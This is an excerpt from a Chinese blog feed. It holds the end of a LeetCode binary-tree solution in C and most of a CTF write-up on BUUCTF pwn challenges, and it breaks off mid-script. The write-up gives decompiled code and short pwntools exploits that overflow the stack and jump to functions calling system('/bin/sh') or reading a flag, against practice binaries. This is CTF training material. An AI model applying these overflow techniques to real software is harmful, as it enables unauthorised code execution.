title="解法一：层次遍历"></a>解法一：层次遍历</h4><p>我们考虑到当我们填充next指针将每一层的结点都连接起来后，<strong>该层所有结点便构成了一个单向链表</strong>，我们可以<strong>通过遍历每一层的链表来构造下一层的链表</strong></p><p>大致过程如下图</p><p><img src="https://i.loli.net/2020/09/28/485DnfumcRterSM.png" alt="BD12E33FCF6E3B97FC6DB3AF5B645CF2.png"></p><h4 id="时间复杂度：-7"><a href="#时间复杂度：-7" class="headerlink" title="时间复杂度："></a>时间复杂度：</h4><p>由于每个结点都要遍历一次，故时间复杂度为<strong>O</strong>(<strong>N</strong>)</p><h4 id="空间复杂度：-7"><a href="#空间复杂度：-7" class="headerlink" title="空间复杂度："></a>空间复杂度：</h4><p>由于没有使用到额外的空间，故空间复杂度为<strong>O</strong>(<strong>1</strong>)</p><p>构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a Node.</span></span><br><span class="line"><span class="comment"> * struct Node &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct Node *left;</span></span><br><span class="line"><span class="comment"> *     struct Node *right;</span></span><br><span class="line"><span class="comment"> *     struct Node *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> * <span class="title">last_node</span>, *<span class="title">next_start</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">connectList</span><span class="params">(struct Node * node)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(last_node)</span><br><span class="line">    &#123;</span><br><span class="line">        last_node-&gt;next = node;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!next_start)</span><br><span class="line">    &#123;</span><br><span class="line">        next_start = node;</span><br><span class="line">    &#125;</span><br><span class="line">    last_node = node;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">struct Node* <span class="title">connect</span><span class="params">(struct Node* root)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!root)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">start</span> = <span class="title">root</span>;</span></span><br><span class="line">    <span class="keyword">while</span>(start)</span><br><span class="line">    &#123;</span><br><span class="line">        last_node = <span class="literal">NULL</span>, next_start = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">while</span>(start)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(start-&gt;left)</span><br><span class="line">                connectList(start-&gt;left);</span><br><span class="line">            <span class="keyword">if</span>(start-&gt;right)</span><br><span class="line">                connectList(start-&gt;right);</span><br><span class="line">            start = start-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        start = next_start;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/10/15/p3if4WBZnAScgLI.png" alt="image.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;0x00-绪论&quot;&gt;&lt;a href=&quot;#0x00-绪论&quot; class=&quot;headerlink&quot; title=&quot;0x00.绪论&quot;&gt;&lt;/a&gt;0x00.绪论&lt;/h1&gt;&lt;p&gt;为了保持编程的一个手感（毕竟疫情以来打的代码比以前少得多了），同时也为了提高自己的姿势水平（x），打算从今天开始刷Leetcode提供的每日一题并在此做一个小小的记录（x）&lt;/p&gt;
&lt;p&gt;希望几年以后这里已经积累了上千道题⑧（&lt;del&gt;没可能的&lt;/del&gt;&lt;/p&gt;
&lt;img src=&quot;https://i.loli.net/2020/10/15/rqasE7pNAxQXy9l.png&quot; alt=&quot;image.png&quot; style=&quot;zoom:50%;&quot; /&gt;</summary>
    
    
    
    <category term="Online Judge" scheme="http://archive.next.arttnba3.cn/categories/Online-Judge/"/>
    
    
    <category term="算法" scheme="http://archive.next.arttnba3.cn/tags/%E7%AE%97%E6%B3%95/"/>
    
    <category term="C/C++" scheme="http://archive.next.arttnba3.cn/tags/C-C/"/>
    
    <category term="题解" scheme="http://archive.next.arttnba3.cn/tags/%E9%A2%98%E8%A7%A3/"/>
    
    <category term="动态规划" scheme="http://archive.next.arttnba3.cn/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"/>
    
    <category term="Leetcode" scheme="http://archive.next.arttnba3.cn/tags/Leetcode/"/>
    
    <category term="链表" scheme="http://archive.next.arttnba3.cn/tags/%E9%93%BE%E8%A1%A8/"/>
    
    <category term="树" scheme="http://archive.next.arttnba3.cn/tags/%E6%A0%91/"/>
    
    <category term="二叉树" scheme="http://archive.next.arttnba3.cn/tags/%E4%BA%8C%E5%8F%89%E6%A0%91/"/>
    
    <category term="深度优先搜索（DFS）" scheme="http://archive.next.arttnba3.cn/tags/%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2%EF%BC%88DFS%EF%BC%89/"/>
    
    <category term="广度优先搜索（BFS）" scheme="http://archive.next.arttnba3.cn/tags/%E5%B9%BF%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2%EF%BC%88BFS%EF%BC%89/"/>
    
    <category term="双指针" scheme="http://archive.next.arttnba3.cn/tags/%E5%8F%8C%E6%8C%87%E9%92%88/"/>
    
    <category term="哈希表" scheme="http://archive.next.arttnba3.cn/tags/%E5%93%88%E5%B8%8C%E8%A1%A8/"/>
    
  </entry>
  
  <entry>
    <title>【CTF题解-0x04】BUUCTF-Pwn write up by arttnb3</title>
    <link href="http://archive.next.arttnba3.cn/2020/09/08/%E3%80%90CTF%E9%A2%98%E8%A7%A3-0x04%E3%80%91BUUOJ-Pwn-write-up-by-arttnb3/"/>
    <id>http://archive.next.arttnba3.cn/2020/09/08/%E3%80%90CTF%E9%A2%98%E8%A7%A3-0x04%E3%80%91BUUOJ-Pwn-write-up-by-arttnb3/</id>
    <published>2020-09-07T18:09:30.000Z</published>
    <updated>2020-12-11T17:24:11.411Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x000-绪论"><a href="#0x000-绪论" class="headerlink" title="0x000.绪论"></a>0x000.绪论</h1><p><a href="buuoj.cn">BUUCTF</a>是一个巨型CTF题库，大致可以类比OIer们的洛谷一样的地方，在BUUCTF上有着分类齐全数量庞大的各方向题目，包括各大CTF的原题</p><p>正所谓”不刷BUU非CTFer“（<del>哪里有过这种奇怪的话啦</del>），作为一名新晋的蒟蒻CTFer&amp;网安专业选手，咱也来做一做BUUCTF上的题，并把题解在博客上存档一份方便后来者学习（<del>快醒醒，哪里会有人看你的博客啦XD</del></p><p>Baby Pwner做的都是pwn题，点开即可查看题解👇</p><blockquote><p>注：我会在题目的旁边写上考点</p></blockquote><a id="more"></a><h1 id="0x001-test-your-nc-nc"><a href="#0x001-test-your-nc-nc" class="headerlink" title="0x001.test your nc - nc"></a>0x001.test your nc - nc</h1><p>拖入IDA分析，发现一运行就能直接getshell</p><p><img src="https://i.loli.net/2020/08/15/AqJPwtME8FmvHos.png" alt="image.png"></p><p>nc，成功getshell，得flag</p><p><img src="https://i.loli.net/2020/08/15/5Ze2Nw94jmRxUJF.png" alt="image.png"></p><h1 id="0x002-rip-ret2text"><a href="#0x002-rip-ret2text" class="headerlink" title="0x002.rip - ret2text"></a>0x002.rip - ret2text</h1><p>惯例的<code>checksec</code>，保护全关</p><p><img src="https://i.loli.net/2020/08/14/HPO2siU8DpyfnYG.png" alt="image.png"></p><p>主函数使用了gets函数，存在栈溢出，偏移量为0xf+8个字节</p><p><img src="https://i.loli.net/2020/08/14/NxMSvtUf7wZ9iY4.png" alt="image.png"></p><p>可以发现直接存在一个<code>system(&quot;/bin/sh&quot;)</code>，返回到这里即可getshell</p><p><img src="https://i.loli.net/2020/08/14/rhUu8p2mc6MyXsi.png" alt="image.png"></p><p>构造payload如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">payload = <span class="string">b'A'</span> * (<span class="number">0xf</span> + <span class="number">8</span>) + p64(<span class="number">0x40118a</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./rip'</span>)<span class="comment">#p = remote('node3.buuoj.cn',26914)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>输入我们的<code>payload</code>，直接getshell，得到flag</p><p><img src="https://i.loli.net/2020/08/14/7fGrIXzylhN49YM.png" alt="image.png"></p><h1 id="0x003-warmup-csaw-2016-ret2text"><a href="#0x003-warmup-csaw-2016-ret2text" class="headerlink" title="0x003.warmup_csaw_2016 - ret2text"></a>0x003.warmup_csaw_2016 - ret2text</h1><p>惯例<code>checksec</code>，保护全关，可以为所欲为</p><p><img src="https://i.loli.net/2020/08/15/2Oy9SNjZuKEI75t.png" alt="image.png"></p><p>拖入IDA，发现可以溢出的<code>gets</code>函数，偏移量是0x40+8个字节</p><p><img src="https://i.loli.net/2020/08/15/UcPklJTz8G5brHx.png" alt="image.png"></p><p>又发现一个可以获得flag的gadget<code>system(&quot;cat flag.txt&quot;)</code>，控制程序返回到这里即可获得flag</p><p><img src="https://i.loli.net/2020/08/15/KLPE8bTj2kWszU3.png" alt="image.png"></p><p>故构造payload如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">payload = <span class="string">b'A'</span>* (<span class="number">0x40</span> + <span class="number">8</span>) + p64(<span class="number">0x400611</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./warm_up_2016'</span>)<span class="comment"># p = remote('node3.buuoj.cn',28660)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>输入我们的payload，得到flag</p><p><img src="https://i.loli.net/2020/08/15/V6ZjsuOYfCUhMLJ.png" alt="image.png"></p><h1 id="0x004-pwn1-sctf-2016-ret2text"><a href="#0x004-pwn1-sctf-2016-ret2text" class="headerlink" title="0x004.pwn1_sctf_2016 - ret2text"></a>0x004.pwn1_sctf_2016 - ret2text</h1><p>惯例的<code>checksec</code>，发现只开了NX保护</p><p><img src="https://i.loli.net/2020/09/07/NAUM59LC7FSuZ6V.png" alt="image.png"></p><p>拖入IDA看一下，<del>然后你就会发现C++逆向出来的东西比**还**</del></p><p><img src="https://i.loli.net/2020/09/07/5FsRKWxZSiME8ug.png" alt="image.png"></p><p>我们不难看出replace函数是在该程序中的一个比较关键的函数，我们先进去简单看看：</p><p><img src="https://i.loli.net/2020/09/07/vwAz9J8tIlN5DpB.png" alt="image.png"></p><p>简单通读一下我们大概知道这段代码的运行过程如下：（<del>不就是**🐎有什么读不懂的，干他就完事了</del></p><p><img src="https://i.loli.net/2020/09/08/U7P6A1HlfkZGsXi.png" alt="image.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> *__stdcall <span class="title">replace</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">string</span> *a1, <span class="built_in">std</span>::<span class="built_in">string</span> *a2, <span class="built_in">std</span>::<span class="built_in">string</span> *a3, <span class="built_in">std</span>::<span class="built_in">string</span> *a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// ST04_4</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// ST04_4</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// ST10_4</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [esp+10h] [ebp-48h]</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// [esp+14h] [ebp-44h]</span></span><br><span class="line">  <span class="keyword">char</span> v10; <span class="comment">// [esp+1Bh] [ebp-3Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [esp+1Ch] [ebp-3Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v12; <span class="comment">// [esp+20h] [ebp-38h]</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// [esp+24h] [ebp-34h]</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// [esp+28h] [ebp-30h]</span></span><br><span class="line">  <span class="keyword">char</span> v15; <span class="comment">// [esp+2Fh] [ebp-29h]</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [esp+30h] [ebp-28h]</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// [esp+34h] [ebp-24h]</span></span><br><span class="line">  <span class="keyword">char</span> v18; <span class="comment">// [esp+38h] [ebp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v19; <span class="comment">// [esp+3Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v20; <span class="comment">// [esp+40h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v21; <span class="comment">// [esp+44h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> v22; <span class="comment">// [esp+48h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">char</span> v23; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line">                                                <span class="comment">// 接收参数为：v6,input,v9,v7</span></span><br><span class="line">                                                <span class="comment">// 其中input为我们的输入，v9为字符串"I"，v7为字符串"you"</span></span><br><span class="line">                                                <span class="comment">// 查汇编源码可知下面的string基本都是a2，也就是input</span></span><br><span class="line">  <span class="keyword">while</span> ( <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="built_in">find</span>(a2, a3, <span class="number">0</span>) != <span class="number">-1</span> )  <span class="comment">// 在input中寻找字符串v9（"I"），如果找不到则find方法会返回-1，跳出循环</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;::allocator(&amp;v10);      <span class="comment">// 新构造了一个allocator&lt;char&gt;类的实例并将地址给到v10</span></span><br><span class="line">    v11 = <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="built_in">find</span>(a2, a3, <span class="number">0</span>);         <span class="comment">// 获得"I"字符串在input中第一次出现的下标</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="built_in">begin</span>(&amp;v12);                   <span class="comment">// input.begin()新构造一个迭代器对象并将地址给到v12</span></span><br><span class="line">    __gnu_cxx::__normal_iterator&lt;<span class="keyword">char</span> *,<span class="built_in">std</span>::<span class="built_in">string</span>&gt;::<span class="keyword">operator</span>+(&amp;v13);<span class="comment">// 构建operator+的迭代器对象实例给到v13</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="built_in">begin</span>(&amp;v14);                   <span class="comment">// input.begin()新构造一个迭代器对象并将地址给到v14</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="built_in">string</span>&lt;__gnu_cxx::__normal_iterator&lt;<span class="keyword">char</span> *,<span class="built_in">std</span>::<span class="built_in">string</span>&gt;&gt;(&amp;v9, v14, v13, &amp;v10);<span class="comment">// v14迭代生成的字符使用allocator（v10）分配内存、使用operator+（v13）接成新字符串给到v8</span></span><br><span class="line">                                                <span class="comment">// 查看汇编可知生成的字符串长度为v11（即生成的字符串为input中第一个"I"的前面所有字符构成的字符串</span></span><br><span class="line">    <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;::~allocator(&amp;v10, v4); <span class="comment">// 析构v10</span></span><br><span class="line">    <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;::allocator(&amp;v15);      <span class="comment">// 新构造了一个allocator&lt;char&gt;类的实例并将地址给到v15</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="built_in">end</span>(&amp;v16);                     <span class="comment">// input.end()新构造一个迭代器对象并将地址给到v16</span></span><br><span class="line">    v17 = <span class="built_in">std</span>::<span class="built_in">string</span>::length(a3);              <span class="comment">// 获得"I"的长度给到v17</span></span><br><span class="line">    v19 = <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="built_in">find</span>(a2, a3, <span class="number">0</span>);         <span class="comment">// 获得"I"字符串在input中第一次出现的下标给到v19</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="built_in">begin</span>(&amp;v20);                   <span class="comment">// begin()新构造一个迭代器对象并将地址给到v20</span></span><br><span class="line">    __gnu_cxx::__normal_iterator&lt;<span class="keyword">char</span> *,<span class="built_in">std</span>::<span class="built_in">string</span>&gt;::<span class="keyword">operator</span>+(&amp;v18);<span class="comment">// 构建operator+的迭代器对象实例给到v18</span></span><br><span class="line">    __gnu_cxx::__normal_iterator&lt;<span class="keyword">char</span> *,<span class="built_in">std</span>::<span class="built_in">string</span>&gt;::<span class="keyword">operator</span>+(&amp;v21);<span class="comment">// 构建operator+的迭代器对象实例给到v21</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="built_in">string</span>&lt;__gnu_cxx::__normal_iterator&lt;<span class="keyword">char</span> *,<span class="built_in">std</span>::<span class="built_in">string</span>&gt;&gt;(&amp;v8, v21, v16, &amp;v15);<span class="comment">// v16迭代生成的字符使用allocator（v15）分配内存、使用operator+（v21）接成新字符串给到v8</span></span><br><span class="line">                                                <span class="comment">// 注意在这里和前面的相似语句中字符串迭代器与operator所传入的位置是相反的</span></span><br><span class="line">                                                <span class="comment">// 可能是因为迭代器从后往前生成字符串？</span></span><br><span class="line">    <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;::~allocator(&amp;v15, v5); <span class="comment">// 析构v15</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="keyword">operator</span>+&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v23, &amp;v9, a4);<span class="comment">// v9+a4生成的字符串给到v23</span></span><br><span class="line">                                                <span class="comment">// 即input中第一个"I"之前的所有字符构成的字符串再加上"you"生成新字符串v23</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="keyword">operator</span>+&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v22, &amp;v23, &amp;v8);<span class="comment">// v23+v8生成的字符串给到v22</span></span><br><span class="line">                                                <span class="comment">// 即v23再加上原input中第一个"I"之后的所有字符构成的字符串生成新字符串v22</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="keyword">operator</span>=(a2, &amp;v22, v6);       <span class="comment">// v22给回到a2（也就是input</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(&amp;v22);                 <span class="comment">// 析构v20</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(&amp;v23);                 <span class="comment">// 析构v21</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(&amp;v8);                  <span class="comment">// 析构v8</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(&amp;v9);                  <span class="comment">// 析构v9</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="built_in">string</span>(a1, a2);                  <span class="comment">// 拷贝input到a1（vuln中v6）</span></span><br><span class="line">  <span class="keyword">return</span> a1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以大概知道replace函数的作用其实是把<strong>输入的字符串中的所有字串A替换成字符串B再重新生成新的字符串</strong>，而在vuln函数中A即为<code>&quot;I&quot;</code>，B即为<code>&quot;you&quot;</code>。</p><p>重新回到<code>vuln</code>函数，我们发现依然看不懂这段代码到底干了啥</p><p>这个时候其实我们可以选择看汇编代码进行辅助阅读（<del>C++逆向出来的东西真的太**了</del></p><p><img src="https://i.loli.net/2020/09/07/SCp5I7mvXc9HDWQ.png" alt="image.png"></p><p>简单结合一下汇编代码与逆向出来的C++代码，我们容易知道该段代码的作用，如下图注释所示：</p><p><img src="https://i.loli.net/2020/09/07/vTxCYDnofhqdSKQ.png" alt="image.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">fgets(&amp;s, <span class="number">32</span>, edata);                         <span class="comment">// 从标准输入流中读入最大32个字符到s</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span>::<span class="keyword">operator</span>=(&amp;input, &amp;s);           <span class="comment">// 将字符串s的值拷贝到string类input中</span></span><br><span class="line"><span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;::allocator((<span class="keyword">int</span>)&amp;v8);    <span class="comment">// 新构造了一个allocator&lt;char&gt;类的实例并将地址给到v8</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span>::<span class="built_in">string</span>((<span class="keyword">int</span>)&amp;v7, (<span class="keyword">int</span>)<span class="string">"you"</span>, (<span class="keyword">int</span>)&amp;v8);<span class="comment">// string类使用allocrator分配内存复制字符串"you"并拷贝到v7上</span></span><br><span class="line"><span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;::allocator((<span class="keyword">int</span>)&amp;v10);   <span class="comment">// 新构造了一个allocator&lt;char&gt;类的实例并将地址给到v10</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span>::<span class="built_in">string</span>((<span class="keyword">int</span>)&amp;v9, (<span class="keyword">int</span>)<span class="string">"I"</span>, (<span class="keyword">int</span>)&amp;v10);<span class="comment">// string类使用allocrator分配内存复制字符串"I"并拷贝到v6上</span></span><br><span class="line">replace((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v6, (<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;input, (<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v9);<span class="comment">// 遍历input，生成新string把原input中的'I'替换为'you'，并将重新生成后的字符串地址给到v6</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span>::<span class="keyword">operator</span>=(&amp;input, &amp;v6, v0);      <span class="comment">// 拷贝v6回到input中，完成替换</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v6);     <span class="comment">// 析构v6</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v9);     <span class="comment">// 析构v9</span></span><br><span class="line"><span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;::~allocator(&amp;v10, v1);   <span class="comment">// 析构v10</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v7);     <span class="comment">// 析构v7</span></span><br><span class="line"><span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;::~allocator(&amp;v8, v2);    <span class="comment">// 析构v8</span></span><br><span class="line">v3 = (<span class="keyword">const</span> <span class="keyword">char</span> *)<span class="built_in">std</span>::<span class="built_in">string</span>::c_str((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;input);<span class="comment">// 将input使用string类的c_str函数变成字符串存放在char数组中并将字符串指针赋给v3</span></span><br><span class="line"><span class="built_in">strcpy</span>(&amp;s, v3);                               <span class="comment">// 将v3拷贝到s上</span></span><br></pre></td></tr></table></figure><p>简单运行一下，我们可以发现程序的确会把输入中的<code>I</code>全部替换成<code>you</code></p><p><img src="https://i.loli.net/2020/09/07/EkemdSOlb9Jj5IM.png" alt="image.png"></p><p>同时我们可以看到，溢出大概需要<code>0x3c</code>个字节，也就是60个字节</p><p><img src="https://i.loli.net/2020/09/07/7iJUWvxtPjVlckS.png" alt="image.png"></p><p>我们可以选择使用20个<code>I</code>作为padding，然后这段padding会被替换成30个<code>you</code>，刚好60个字节，在后面再覆盖掉ebp与返回地址控制程序返回到<code>get_flag</code>函数即可得到flag</p><p>故构造exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">get_flag_addr = <span class="number">0x8048fd</span></span><br><span class="line">p = process(<span class="string">'./pwn1_sctf_2016'</span>)<span class="comment">#p = remote('node3.buuoj.cn',27140)</span></span><br><span class="line">payload = <span class="string">b'I'</span>*<span class="number">20</span> + p32(<span class="number">0xdeadbeef</span>) + p32(get_flag_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br></pre></td></tr></table></figure><p>发送payload，得到flag</p><p><img src="https://i.loli.net/2020/09/07/nZcqDhPo5sFWm6X.png" alt="image.png"></p><blockquote><p>C++逆向是真的kskjklasjdkajskdhasjdgsgdhsgdsajkqpiwourevz</p></blockquote><h1 id="0x005-ciscn-2019-n-1-overwrite"><a href="#0x005-ciscn-2019-n-1-overwrite" class="headerlink" title="0x005.ciscn_2019_n_1 - overwrite"></a>0x005.ciscn_2019_n_1 - overwrite</h1><p>惯例的<code>checksec</code>，发现只开了NX保护</p><p><img src="https://i.loli.net/2020/09/08/IlHxaAwpoKmFdJ5.png" alt="image.png"></p><p>拖入IDA进行分析，main中调用了func函数，直接进去看</p><p><img src="https://i.loli.net/2020/09/08/RyLZ98UPXJp4jQh.png" alt="image.png"></p><p>当v2为11.28125时我们可以获取flag，而gets函数读入到v1存在溢出点可以覆写掉v2</p><p>那么问题来了，<strong>浮点数11.28125在内存中是如何表示的呢</strong></p><p>我们可以直接跳转到这个数据所储存的地方，发现是<code>0x41348000</code></p><p><img src="https://i.loli.net/2020/09/08/wvTE9Qhr18oXU6Z.png" alt="image.png"></p><p>故构造exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span 